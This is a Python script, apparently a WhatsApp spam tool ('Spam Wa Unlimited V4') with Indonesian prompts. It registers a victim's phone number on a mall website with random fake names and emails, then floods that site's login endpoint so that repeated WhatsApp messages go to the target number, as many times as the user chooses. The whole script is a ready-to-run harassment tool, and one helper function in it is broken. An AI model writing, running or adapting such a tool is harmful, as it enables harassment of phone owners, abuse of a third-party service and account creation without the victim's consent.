#-*-coding:utf-8-*-
import requests, sys, time, random, json, os
from multiprocessing.pool import ThreadPool
try:
 config = open("config.json","r").read()
 if config == "":
  os.system("rm config.json")
  os.system('echo "{}" > config.json')
 else:pass
except:os.system('echo "{}" > config.json')

qu = '\033[0;36m' #aqua
hi = '\033[0;32m' #hijau
pu = '\033[0;37m' #putih
me = '\033[0;31m' #merah
ku = '\033[0;33m' #kuning
def tik(text):
  hm = "%"
  for eek in range(101):
   sys.stdout.write('\r%s[%s!%s] %s%s %s(%s%s%s%s)'%(pu,me,pu,ku,text,pu,me,str(eek),hm,pu))
   time.sleep(0.03)
   sys.stdout.flush()
def spamsatu():
 for primitif in range(jumlah):
  modestu = requests.post('https://tasya.tunjunganplaza.com/login/in',data={'whatsapp':'0'+nomor,'password':pw,'rememberme':'0'}).text
  if json.loads(modestu)["pesan"] == "Success":
   sil += 1
   sys.stdout.write('\r%s[%s!%s] %sSuccess %s(%sSukses%s:%s%s|%sGagal%s:%s%s)'%(pu,me,pu,hi,pu,hi,pu,sil,pu,me,pu,gal,pu))
   sys.stdout.flash()
def check(no,pw):
 #tik('Mengecek apakah no yg kamu masukkan, sudah terdaftar atau blm')
 tik('Mengecek registari...')
 sys.stdout.flush()
 cek = requests.post("https://tasya.tunjunganplaza.com/login/auth",data={'firstname':str(random.randint(0,1000000)),'lastname':str(random.randint(0,100000000)),'email':str(random.randint(0,100000000))+'@gmail.com','pgcard':'0'+no,'password':pw,'whatsapp':'0'+no}).text
 if json.loads(cek)["pesan"] == "Proses Registrasi Berhasil":
  sys.stdout.write('\r%s[%s!%s] %sKamu belum terdaftar'%(pu,me,pu,me))
  sys.stdout.flush()
  time.sleep(2)
  tik('Sedang meregistasi...')
  sys.stdout.flush()
  time.sleep(2)
  sys.stdout.write('\r%s[%s!%s] %sRegistari berhasil √'%(pu,me,pu,hi))
  sys.stdout.flush()
  time.sleep(2)
  tik('Melanjutkan dalam beberapa detik...')
 else:sys.stdout.write('\r%s[%s!%s] %sNomor hp yang kamu masukkan sudah terdaftar √'%(pu,me,pu,hi));sys.stdout.flush();time.sleep(2);tik('Melanjutkan dalam beberapa detik...')

def banner():
 print """%s
╦ ╦┌─┐╦ ╦┌┐┌┬  ┬┌┬┐┬┌┬┐┌─┐┌┬┐╦  ╦ %sAuthor %sabilseno11%s
║║║├─┤║ ║││││  │││││ │ ├┤  ││╚╗╔╝ %sGithub %sgithub.com/AbilSeno%s
╚╩╝┴ ┴╚═╝┘└┘┴─┘┴┴ ┴┴ ┴ └─┘─┴┘ ╚╝  %sSpam Wa Unlimited V4"""%(ku,pu,ku,ku,pu,ku,ku,pu)

def modesatu():
 while True:
  global nomor
  nomor = raw_input("%s[%s?%s] %sMasukkan nomor telepon (ex:881188xxx) : %s"%(pu,me,pu,qu,hi))
  if len(nomor) < 5: print "%s[%s!%s] %sMasukkan nomor telepon dengan benar!!"%(pu,me,pu,me)
  elif nomor.startswith(tuple(['0','+62','62'])): print "%s[%s!%s] %sMasukkan nomor tanpa awalan 0,+62,ataupun 62"%(pu,me,pu,me)
  else:break
 while True:
  try:
   global jumlah
   jumlah = int(raw_input("%s[%s?%s] %sMasukkan jumlah spam : %s"%(pu,me,pu,qu,hi)))
  except:print("%s[%s!%s] %sItu bukan nomor, blokk!!"%(pu,me,pu,me))
  else:break
 pw = str(random.randint(0,10000000))
 hhh = json.loads(open("config.json","rb").read())
 try:
  hhh[nomor]
 except: hhh[nomor] = pw;open("config.json","wb").write(json.dumps(hhh))
 else:pw=hhh[nomor]
 sil = 0
 gal = 0
 check(nomor,pw)
 print "\n%s+---------------------%sTarget:%s%s%s---------------------+"%(qu,ku,me,nomor,qu)
 for primitif in range(jumlah):
  modestu = requests.post('https://tasya.tunjunganplaza.com/login/in',data={'whatsapp':'0'+nomor,'password':pw,'rememberme':'0'}).text
  if json.loads(modestu)["pesan"] == "Success":
   sil += 1
   sys.stdout.write('\r%s[%s!%s] %sSuccess %s(%sSukses%s:%s%s|%sGagal%s:%s%s)'%(pu,me,pu,hi,pu,hi,pu,sil,pu,me,pu,gal,pu))
   sys.stdout.flush()
   if primitif == jumlah:
    if sil == 0:pass
    else:
     sil = sil-1
  else:
   gal += 1
   sys.stdout.write('\r%s[%s!%s] %sFailed %s(%sSukses%s:%s%s|%sGagal%s:%s%s)'%(pu,me,pu,me,pu,hi,pu,sil,pu,me,pu,gal,pu))
   sys.stdout.flush()
   if primitif == jumlah:
    if gal == 0:pass
    else:
     gal = gal-1
 print "\n%s[%s!%s] %sSelesai.."%(pu,me,pu,hi)


if __name__ == "__main__":
 try:
  banner()
  modesatu()
 except requests.ConnectionError:print "%s[%s!%s] %sPeriksa koneksi internetmu!!"%(pu,me,pu,me)

